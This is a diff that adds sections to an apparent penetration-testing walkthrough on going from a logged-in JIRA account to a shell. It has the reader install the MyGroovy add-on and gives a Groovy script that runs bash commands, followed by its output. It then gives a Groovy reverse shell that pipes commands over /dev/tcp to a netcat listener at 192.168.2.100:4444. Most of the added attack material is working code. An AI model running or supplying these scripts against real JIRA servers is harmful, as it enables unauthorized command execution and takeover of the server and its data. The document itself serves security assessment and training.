@@ -23,4 +23,35 @@ After masscan finished scanning the LAN, you will see output results inside of t
   
 ## 0x02 : Getting Remote Code Execution from JIRA&nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/From_JIRA_to_Shell/master/img/bomb.jpg" width="20"/>  
   
-You are probably saying OK, I'm logged in on JIRA, now what? You have to know that JIRA supports the *Groovy* language. Groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the Java platform aimed at improving developer productivity thanks to a concise, familiar and easy to learn syntax. It integrates smoothly with any Java program, and immediately delivers to your application powerful features, including scripting capabilities, Domain-Specific Language authoring, runtime and compile-time meta-programming and functional programming.
+You are probably saying OK, I'm logged in on JIRA, now what? You have to know that JIRA supports the *Groovy* language. Groovy is a powerful, optionally typed and dynamic language, with static-typing and static compilation capabilities, for the Java platform aimed at improving developer productivity thanks to a concise, familiar and easy to learn syntax. It integrates smoothly with any Java program, and immediately delivers to your application powerful features, including scripting capabilities, Domain-Specific Language authoring, runtime and compile-time meta-programming and functional programming.  
+  
+We will use the add-on *MyGroovy* in order to execute our script to execute shell commands. To do so, go to the Administration button (top-right) and choose *Add-ons*. It will ask again for your credentials. In the search field, type *MyGroovy*, press Enter and click on the Install button. After the installation, go on the left menu and click on *MyGroovy console*. You should see this in your web browser:
+  
+<img src="https://raw.githubusercontent.com/syriusbughunt/From_JIRA_to_Shell/master/img/screen2.jpg" width="1000"/> 
+  
+Are you ready for RCE? In the console box, type:
+```
+def command = '''
+    touch /tmp/jira-RCE
+'''
+def proc = ['bash', '-c', command].execute()
+proc.waitFor()
+println proc.text
+```  
+Let's see if we had success with our script...  
+```
+root@blackb0x:/root# ls -al /tmp/
+drwxrwxrwt 12 root   root    32768 Dec  2 01:32 .
+drwxr-xr-x 25 root   root     4096 Nov 25 12:57 ..
+-rw-r-----  1 jira   jira        0 Dec  2 01:32 jira-RCE
+```  
+<img src="https://raw.githubusercontent.com/syriusbughunt/From_JIRA_to_Shell/master/img/shrug.jpg" width="200"/> 
+Easy like that.  
+  
+## 0x03 : Let's get reverse shell !&nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/From_JIRA_to_Shell/master/img/shell1.png" width="20"/>
+To finalize this assessment, I believe a cool way would be to obtain reverse shell from JIRA. In order to get a rev shell, we will type again in the console box of *MyGroovy* add-on the following script assuming your netcat listener is 192.168.2.100 on port 4444:  
+```  
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.2.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor() 
+```  
